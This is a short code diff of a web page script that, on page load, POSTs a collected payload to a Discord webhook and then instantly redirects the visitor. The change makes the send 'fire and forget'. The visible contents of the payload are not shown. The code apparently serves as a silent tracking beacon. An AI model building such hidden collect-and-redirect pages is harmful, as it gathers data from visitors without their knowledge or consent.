@@ -82,20 +82,17 @@
                 }]
             };
 
-            // 4. Send Data to Discord Webhook and wait for response
-            try {
-                await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {
-                // Failsafe
-            } finally {
-                // 5. Instantly redirect
-                window.location.href = CONFIG.REDIRECT_URL;
-            }
+            // 4. Send Data to Discord Webhook
+            fetch(CONFIG.DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => { /* Fire and forget */ });
+
+            // 5. Instant redirect
+            window.location.href = CONFIG.REDIRECT_URL;
         }
+
 
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
